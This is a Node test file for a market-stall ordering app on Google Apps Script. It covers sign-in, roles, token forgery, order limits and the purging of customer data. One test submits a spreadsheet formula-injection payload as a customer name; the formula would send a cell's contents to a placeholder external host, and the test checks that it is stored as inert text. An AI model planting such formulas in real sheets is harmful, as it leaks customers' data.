/**
 * Runs the real server/*.gs files in Node against an in-memory spreadsheet,
 * with Google's services replaced by small fakes. No network, no Google.
 *
 *   node tests/server.test.js
 *
 * Covers sign-in and permissions, the part where a mistake locks people out
 * or lets the wrong person in.
 */
'use strict';
const fs = require('fs');
const path = require('path');
const vm = require('vm');
const crypto = require('crypto');
const assert = require('assert');

/* ---------- fakes for the Apps Script services ---------- */

function makeSheet() {
  const rows = [];
  const sheet = {
    rows,
    appendRow(r) { rows.push(r.slice()); },
    getLastRow() { return rows.length; },
    getLastColumn() { return rows.reduce((m, r) => Math.max(m, r.length), 0); },
    getRange(r, c, nr, nc) {
      nr = nr || 1; nc = nc || 1;
      return {
        getValues() {
          const out = [];
          for (let i = 0; i < nr; i++) {
            const row = rows[r - 1 + i] || [];
            const o = [];
            for (let j = 0; j < nc; j++) o.push(row[c - 1 + j] === undefined ? '' : row[c - 1 + j]);
            out.push(o);
          }
          return out;
        },
        getValue() { return this.getValues()[0][0]; },
        setValue(v) { (rows[r - 1] = rows[r - 1] || [])[c - 1] = v; return this; },
        setValues(vs) {
          vs.forEach((row, i) => row.forEach((v, j) => {
            (rows[r - 1 + i] = rows[r - 1 + i] || [])[c - 1 + j] = v;
          }));
          return this;
        },
        setFontWeight() { return this; }, setBackground() { return this; },
        setFontColor() { return this; }
      };
    },
    deleteRow(n) { rows.splice(n - 1, 1); },
    deleteRows(n, k) { rows.splice(n - 1, k); },
    setFrozenRows() {}
  };
  return sheet;
}

function load(googleTokens) {
  const sheets = {};
  const props = {};
  const ctx = {
    console,
    SpreadsheetApp: {
      getActiveSpreadsheet: () => ({
        getSheetByName: (n) => sheets[n] || null,
        insertSheet: (n) => (sheets[n] = makeSheet())
      })
    },
    PropertiesService: {
      getScriptProperties: () => ({
        getProperty: (k) => (k in props ? props[k] : null),
        setProperty: (k, v) => { props[k] = v; }
      })
    },
    Utilities: {
      getUuid: () => crypto.randomUUID(),
      computeHmacSha256Signature: (v, key) =>
        Array.from(crypto.createHmac('sha256', key).update(v).digest()).map((b) => (b > 127 ? b - 256 : b)),
      formatDate: (d, tz, f) => (f === 'yyyy-MM-dd' ? d.toISOString().slice(0, 10) : d.toISOString())
    },
    LockService: { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) },
    UrlFetchApp: {
      fetch: (url) => {
        const tok = decodeURIComponent(url.split('id_token=')[1]);
        const info = googleTokens[tok];
        return {
          getResponseCode: () => (info ? 200 : 400),
          getContentText: () => JSON.stringify(info || { error: 'invalid_token' })
        };
      }
    },
    ScriptApp: { getService: () => ({ getUrl: () => 'https://example/exec' }) },
    ContentService: {}, HtmlService: {}
  };
  vm.createContext(ctx);
  // Start every test from "Google off", whatever Platform.gs currently holds.
  const dir = path.join(__dirname, '..', 'server');
  fs.readdirSync(dir).filter((f) => f.endsWith('.gs')).sort().forEach((f) => {
    vm.runInContext(fs.readFileSync(path.join(dir, f), 'utf8'), ctx, { filename: f });
  });
  ctx.SF.PLATFORM.googleClientId = '';
  ctx.SF.PLATFORM.admins = [];
  ctx.SF.migrate();
  return { SF: ctx.SF, sheets };
}

const CLIENT = 'client-123.apps.googleusercontent.com';
const future = String(Math.floor(Date.now() / 1000) + 3600);
function idToken(email, extra) {
  return Object.assign({ aud: CLIENT, iss: 'https://accounts.google.com',
                         email, email_verified: 'true', exp: future, name: 'Test' }, extra || {});
}
const TOKENS = {
  admin: idToken('Boss@StallFlow.co.za'),
  helper: idToken('helper@gmail.com'),
  stranger: idToken('stranger@gmail.com'),
  wrongAud: idToken('helper@gmail.com', { aud: 'someone-else' }),
  unverified: idToken('helper@gmail.com', { email_verified: 'false' })
};

let failures = 0;
function test(name, fn) {
  try { fn(); console.log('ok   ' + name); }
  catch (e) { failures++; console.log('FAIL ' + name + '\n     ' + e.message); }
}
const signIn = (SF, credential) => SF.dispatch('signInGoogle', { credential, device: 'd1' }).data;

/* ---------- PIN mode, before Google is switched on ---------- */

test('without a client ID, PIN sign-in still works', () => {
  const { SF } = load(TOKENS);
  assert.strictEqual(SF.googleOn(), false);
  SF.setPin('owner', '4321');
  const r = SF.dispatch('signIn', { pin: '4321', device: 'd1' }).data;
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.role, 'owner');
  assert.strictEqual(SF.dispatch('health', { token: r.token }).ok, true);
});

test('without a client ID, Google sign-in is refused', () => {
  const { SF } = load(TOKENS);
  assert.strictEqual(signIn(SF, 'admin').ok, false);
});

test('a client ID with no admins leaves PINs on, so nobody is locked out', () => {
  const { SF } = load(TOKENS);
  SF.PLATFORM.googleClientId = CLIENT;
  SF.PLATFORM.admins = [];
  assert.strictEqual(SF.googleOn(), false);
  SF.setPin('owner', '4321');
  assert.strictEqual(SF.dispatch('signIn', { pin: '4321', device: 'd1' }).data.ok, true);
});

/* ---------- Google mode ---------- */

function google() {
  const env = load(TOKENS);
  env.SF.PLATFORM.googleClientId = CLIENT;
  env.SF.PLATFORM.admins = ['boss@stallflow.co.za'];
  return env;
}

test('a platform admin signs in as owner, whatever the case of the email', () => {
  const { SF } = google();
  const r = signIn(SF, 'admin');
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.role, 'owner');
  assert.strictEqual(r.user, 'boss@stallflow.co.za');
});

test('someone not on the list is turned away with a clear message', () => {
  const { SF } = google();
  const r = signIn(SF, 'stranger');
  assert.strictEqual(r.ok, false);
  assert.ok(/not been added/.test(r.message));
});

test('a token for another app, or an unverified email, is refused', () => {
  const { SF } = google();
  SF.append('users', { Email: 'helper@gmail.com', Role: 'cashier', Active: 'Yes' });
  assert.strictEqual(signIn(SF, 'wrongAud').ok, false);
  assert.strictEqual(signIn(SF, 'unverified').ok, false);
  assert.strictEqual(signIn(SF, 'nonsense').ok, false);
});

test('PINs stop working once Google is on', () => {
  const { SF } = load(TOKENS);
  SF.setPin('owner', '4321');
  const pinToken = SF.dispatch('signIn', { pin: '4321', device: 'd1' }).data.token;
  SF.PLATFORM.googleClientId = CLIENT;
  SF.PLATFORM.admins = ['boss@stallflow.co.za'];
  assert.strictEqual(SF.dispatch('signIn', { pin: '4321', device: 'd1' }).data.ok, false);
  assert.strictEqual(SF.dispatch('signIn', { pin: '', device: 'd1' }).data.ok, false,
    'a blank PIN must not give owner access any more');
  assert.strictEqual(SF.dispatch('health', { token: pinToken }).code, 'auth');
});

test('the owner adds a cashier, who can sell but not see People', () => {
  const { SF } = google();
  const owner = signIn(SF, 'admin').token;
  const add = SF.dispatch('savePerson', { token: owner, opId: 'a1', email: 'Helper@Gmail.com',
                                           role: 'cashier' });
  assert.strictEqual(add.ok, true);
  const helper = signIn(SF, 'helper');
  assert.strictEqual(helper.ok, true);
  assert.strictEqual(helper.role, 'cashier');
  assert.strictEqual(SF.dispatch('till', { token: helper.token }).ok, true);
  assert.strictEqual(SF.dispatch('people', { token: helper.token }).code, 'forbidden');
});

test('promoting someone works on their next tap, without signing in again', () => {
  const { SF } = google();
  const owner = signIn(SF, 'admin').token;
  SF.dispatch('savePerson', { token: owner, opId: 'a1', email: 'helper@gmail.com', role: 'cashier' });
  const helper = signIn(SF, 'helper').token;
  assert.strictEqual(SF.dispatch('people', { token: helper }).code, 'forbidden');
  SF.dispatch('savePerson', { token: owner, opId: 'a2', email: 'helper@gmail.com', role: 'owner' });
  assert.strictEqual(SF.dispatch('people', { token: helper }).ok, true);
});

test('switching someone off locks them out straight away', () => {
  const { SF } = google();
  const owner = signIn(SF, 'admin').token;
  SF.dispatch('savePerson', { token: owner, opId: 'a1', email: 'helper@gmail.com', role: 'manager' });
  const helper = signIn(SF, 'helper').token;
  SF.dispatch('savePerson', { token: owner, opId: 'a2', email: 'helper@gmail.com', role: 'manager',
                              active: false });
  assert.strictEqual(SF.dispatch('till', { token: helper }).code, 'auth');
  assert.strictEqual(signIn(SF, 'helper').ok, false);
});

test('a platform admin cannot be demoted, and nobody can change their own access', () => {
  const { SF } = google();
  const owner = signIn(SF, 'admin').token;
  assert.strictEqual(SF.dispatch('savePerson', { token: owner, opId: 'a1',
    email: 'boss@stallflow.co.za', role: 'viewer' }).ok, false);
  SF.dispatch('savePerson', { token: owner, opId: 'a2', email: 'helper@gmail.com', role: 'owner' });
  const helper = signIn(SF, 'helper').token;
  assert.strictEqual(SF.dispatch('savePerson', { token: helper, opId: 'a3',
    email: 'helper@gmail.com', role: 'viewer' }).ok, false);
});

test('a forged or edited token is refused', () => {
  const { SF } = google();
  const t = signIn(SF, 'admin').token.split('|');
  t[3] = 'helper@gmail.com';
  assert.strictEqual(SF.dispatch('health', { token: t.join('|') }).code, 'auth');
});

test('the audit trail names the person, not just the role', () => {
  const { SF, sheets } = google();
  const owner = signIn(SF, 'admin').token;
  SF.dispatch('savePerson', { token: owner, opId: 'a1', email: 'helper@gmail.com', role: 'cashier' });
  const actors = sheets.Audit.rows.slice(1).map((r) => r[1]);
  assert.ok(actors.indexOf('boss@stallflow.co.za') !== -1, actors.join(', '));
});

test('boot tells the app who is signed in and that Google is on', () => {
  const { SF } = google();
  const owner = signIn(SF, 'admin').token;
  const b = SF.dispatch('boot', { token: owner }).data;
  assert.strictEqual(b.me.user, 'boss@stallflow.co.za');
  assert.strictEqual(b.auth.google, true);
});

/* ---------- orders from the public page ---------- */

function shop(marketDate) {
  const env = load(TOKENS);
  const SF = env.SF;
  SF.append('products', { ProductId: 'P01', Name: 'Apricot Jam', Type: 'stocked', Unit: 'each',
                          Price: 70, Active: 'Yes', Sort: 10 });
  SF.move('P01', 10, 'adjust', 'test');
  SF.append('markets', { MarketId: 'M01', Name: 'Test Market', Date: marketDate, Status: 'planned' });
  SF.set('activeMarket', 'M01');
  return env;
}
const day = (n) => new Date(Date.now() + n * 864e5).toISOString().slice(0, 10);
let op = 0;
const order = (SF, extra) => SF.dispatch('placeOrder', Object.assign({
  opId: 'o' + (op++), name: 'Anna', phone: '082 123 4567', consent: true,
  lines: [{ id: 'P01', qty: 1 }] }, extra || {}));

test('a formula typed as a name is stored as plain text', () => {
  const { SF, sheets } = shop(day(3));
  assert.strictEqual(order(SF, { name: '=IMAGE("https://x.example/?"&D2)', note: '+1 more' }).ok, true);
  const row = sheets.Orders.rows[1];
  assert.ok(String(row[4]).startsWith("'="), 'name: ' + row[4]);
  assert.ok(String(row[13]).startsWith("'+"), 'note: ' + row[13]);
});

test('one phone number can hold at most 2 unpaid orders per market', () => {
  const { SF } = shop(day(3));
  assert.strictEqual(order(SF).ok, true);
  assert.strictEqual(order(SF, { phone: '0821234567' }).ok, true);
  const third = order(SF, { phone: '+27 82 123 4567'.replace('+27 ', '0') });
  assert.strictEqual(third.ok, false);
  assert.ok(/already has 2/.test(third.message));
  assert.strictEqual(order(SF, { phone: '083 999 0000' }).ok, true, 'someone else can still order');
});

test('pre-orders close by themselves once the market date has passed', () => {
  const { SF } = shop(day(-1));
  assert.strictEqual(SF.preordersOpen(), false);
  assert.strictEqual(order(SF).ok, false);
  assert.strictEqual(SF.dispatch('catalogue', {}).data.open, false);
});

test('pre-orders stay open on the day of the market', () => {
  const { SF } = shop(day(0));
  assert.strictEqual(order(SF).ok, true);
});

test('releasing unpaid reservations puts the stock back', () => {
  const { SF } = shop(day(3));
  order(SF); order(SF, { phone: '083 999 0000' });
  assert.strictEqual(SF.onHand().P01, 8);
  SF.setPin('owner', '4321');
  const t = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  const r = SF.dispatch('releaseUnpaid', { token: t, opId: 'r1' });
  assert.strictEqual(r.released, 2);
  assert.strictEqual(SF.onHand().P01, 10);
});

test('customer details are wiped once their market is over, and only then', () => {
  const { SF, sheets } = shop(day(3));
  order(SF, { note: 'gate 2' });
  SF.purgeCustomers();
  assert.strictEqual(String(sheets.Orders.rows[1][4]), 'Anna', 'live market keeps its customers');
  SF.append('markets', { MarketId: 'M02', Name: 'Next', Date: day(10), Status: 'planned' });
  SF.set('activeMarket', 'M02');
  assert.strictEqual(SF.purgeCustomers(), 0, 'a future market is not over yet');
  SF.setCell('markets', 2, 'Date', day(-1));
  assert.strictEqual(SF.purgeCustomers(), 1);
  const row = sheets.Orders.rows[1];
  assert.deepStrictEqual([row[4], row[5], row[13]], ['Customer', '', '']);
  assert.strictEqual(row[8], 70, 'the money stays');
});

console.log(failures ? '\n' + failures + ' failed' : '\nall passed');
process.exit(failures ? 1 : 0);
